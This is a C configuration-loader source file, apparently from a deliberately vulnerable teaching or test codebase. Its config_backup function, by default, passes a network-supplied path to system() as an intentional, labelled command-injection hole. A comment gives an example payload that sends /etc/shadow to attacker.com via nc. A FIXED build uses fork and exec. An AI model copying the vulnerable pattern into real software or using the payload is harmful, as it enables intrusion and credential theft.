#include "config.h"
#include "logger.h"
#include <sys/wait.h>

typedef struct config_entry {
    char key[MAX_CONFIG_LINE];
    char value[MAX_CONFIG_LINE];
    struct config_entry *next;
} config_entry_t;

static config_entry_t *g_config_head = NULL;
static char g_config_path_buf[MAX_PATH_LEN] = {0};

static config_entry_t *config_find(const char *key) {
    config_entry_t *cur = g_config_head;
    while (cur) {
        if (strcmp(cur->key, key) == 0) return cur;
        cur = cur->next;
    }
    return NULL;
}

int config_load(const char *config_path) {
    FILE *fp = fopen(config_path, "r");
    if (!fp) {
        LOG_ERROR("Failed to open config file: %s", config_path);
        return -1;
    }

    strncpy(g_config_path_buf, config_path, sizeof(g_config_path_buf) - 1);

    char line[MAX_CONFIG_LINE];
    while (fgets(line, sizeof(line), fp)) {
        if (line[0] == '#' || line[0] == '\n' || line[0] == '\r') continue;

        char *eq = strchr(line, '=');
        if (!eq) continue;

        *eq = '\0';
        char *key = line;
        char *value = eq + 1;

        /* Trim whitespace */
        while (*key == ' ' || *key == '\t') key++;
        char *kend = key + strlen(key) - 1;
        while (kend > key && (*kend == ' ' || *kend == '\t' || *kend == '\n' || *kend == '\r')) {
            *kend = '\0'; kend--;
        }

        while (*value == ' ' || *value == '\t') value++;
        char *vend = value + strlen(value) - 1;
        while (vend > value && (*vend == ' ' || *vend == '\t' || *vend == '\n' || *vend == '\r')) {
            *vend = '\0'; vend--;
        }

        config_entry_t *entry = calloc(1, sizeof(config_entry_t));
        if (!entry) continue;
        strncpy(entry->key, key, sizeof(entry->key) - 1);
        strncpy(entry->value, value, sizeof(entry->value) - 1);
        entry->next = g_config_head;
        g_config_head = entry;

        LOG_DEBUG("Config loaded: %s = %s", entry->key, entry->value);
    }

    fclose(fp);
    LOG_INFO("Configuration loaded from %s", config_path);
    return 0;
}

char *config_get(const char *key, const char *default_val) {
    config_entry_t *entry = config_find(key);
    return entry ? entry->value : (char *)default_val;
}

int config_get_int(const char *key, int default_val) {
    char *val = config_get(key, NULL);
    if (!val) return default_val;
    return atoi(val);
}

/* ───────────────────────────────────────────────────────────────────
 * VULNERABILITY: Command Injection
 *
 * The backup path is received from the network (user-controlled) and
 * concatenated directly into a shell command executed via system().
 * An attacker can inject shell metacharacters to execute arbitrary
 * commands on the server.
 *
 * Example attack payload:
 *   dest_path = "/tmp/x; cat /etc/shadow | nc attacker.com 4444 #"
 * ─────────────────────────────────────────────────────────────────── */
void config_backup(const char *dest_path) {
#ifdef FIXED
    /* FIXED: use fork+exec to avoid shell interpretation */
    pid_t pid = fork();
    if (pid == 0) {
        /* child */
        const char *argv[] = { "cp", "-r", "/etc/securefile", dest_path, NULL };
        execvp("cp", (char * const *)argv);
        _exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        LOG_INFO("Config backup completed to %s (status=%d)", dest_path, status);
    } else {
        LOG_ERROR("Fork failed for config backup");
    }
#else
    /* VULNERABLE: direct shell command with user input */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cp -r /etc/securefile %s", dest_path);
    LOG_INFO("Executing backup: %s", cmd);
    int ret = system(cmd);
    if (ret != 0) {
        LOG_ERROR("Backup failed: %s", cmd);
    } else {
        LOG_INFO("Config backup completed to %s", dest_path);
    }
#endif
}

void config_free(void) {
    config_entry_t *cur = g_config_head;
    while (cur) {
        config_entry_t *next = cur->next;
        free(cur);
        cur = next;
    }
    g_config_head = NULL;
}
